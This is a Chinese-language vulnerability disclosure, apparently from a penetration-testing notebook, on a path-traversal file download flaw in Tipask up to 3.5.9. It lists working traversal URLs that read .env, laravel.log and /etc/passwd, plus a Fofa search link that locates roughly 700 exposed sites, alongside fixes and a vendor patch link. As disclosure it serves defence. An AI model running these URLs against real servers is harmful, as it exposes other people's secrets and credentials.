---
title: "【负责任的漏洞披露】Tipask存在后台本地文件任意下载漏洞"
slug: bunw7e
translationKey: bunw7e
date: 2021-09-16T15:34:53+08:00
source: yuque/penetration
---

```php
http://tipask/attach/download/attachments-2021-09-4oFjTAjm6142e9d617e23.pdf

                                        attachments-2021-09-4oFjTAjm6142e9d617e23.pdf

E:\Desktop\CodeAudit\v3.5.5\storage\app\ attachments\2021\09



E:\Desktop\CodeAudit\v3.5.5\storage\logs\laravel.log


# 
E:\Desktop\CodeAudit\v3.5.5\storage\app\..-logs-laravel.log

E:\Desktop\CodeAudit\v3.5.5\.env
 
  E:\Desktop\CodeAudit\v3.5.5\storage\app\..-..-.env
```



Tipask最新版本存在“本地文件任意下载”漏洞，攻击者可构造特制的输入，下载Tipask服务器上的任意文件，如`.env`，`/etc/passwd`，`laravel.log`等，泄露服务器上的重要敏感信息，危害较大，目前公网有约700+的客户可能受影响。



# 简介：
（1）`Tipask<=3.5.9`的最新版，在下载附件的时候，未能限制用户输入的路径参数

（2）漏洞的利用，需要登录用户的身份，成功利用该漏洞的攻击者可下载Tipask服务器上的任意文件，如`.env`，`/etc/passwd`，`laravel.log`等



# **受影响范围：**
Tipask <=3.5.9 全部受影响，即Tipask所有版本

Fofa dork：[https://fofa.so/result?qbase64=YXBwPSJUaXBhc2st5YWs5Y%2B45Lqn5ZOBIg%3D%3D](https://fofa.so/result?qbase64=YXBwPSJUaXBhc2st5YWs5Y%2B45Lqn5ZOBIg%3D%3D)



有700+的Tipask环境

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631778554726-34b52dc3-0abb-4991-a59c-408c7a40e739.png)

[  
  
  
  
](https://learnblockchain.cn/)

# 复现步骤：
注册、登录后，直接访问以下地址即可：

```php
https://tipask/attach/download/..-..-.env
http://tipask/attach/download/..-logs-laravel.log
http://tipask/attach/download/..-..-..-..-..-..-..-etc-passwd
```



# 修复方案
漏洞涉及两个文件：

（1）`app\Http\Controllers\AttachController.php`

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1631778109392-4b3e80b4-081a-4933-9e02-1b76e24e7085.png)



（2）`<font style="color:rgb(23, 43, 77);">image/show</font>`<font style="color:rgb(23, 43, 77);"> 接口也存在此问题，请一并修复</font>`app\Http\Controllers\ImageController.php`



1. <font style="color:rgb(23, 43, 77);">限制要读取的目录，如使用</font>`<font style="color:rgb(23, 43, 77);">basename()</font>`<font style="color:rgb(23, 43, 77);">来处理用户的输入参数</font>
2. <font style="color:rgb(23, 43, 77);">用户输入参数中，禁止包含【</font>`<font style="color:rgb(23, 43, 77);">..</font>`<font style="color:rgb(23, 43, 77);">】</font>

<font style="color:rgb(23, 43, 77);"></font>

<font style="color:rgb(23, 43, 77);"></font>

<font style="color:rgb(23, 43, 77);"></font>

目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接：[https://github.com/sdfsky/tipask/commit/9b5f13d1708e9a5dc0959cb8a97be1c32b94ca69](https://github.com/sdfsky/tipask/commit/9b5f13d1708e9a5dc0959cb8a97be1c32b94ca69)

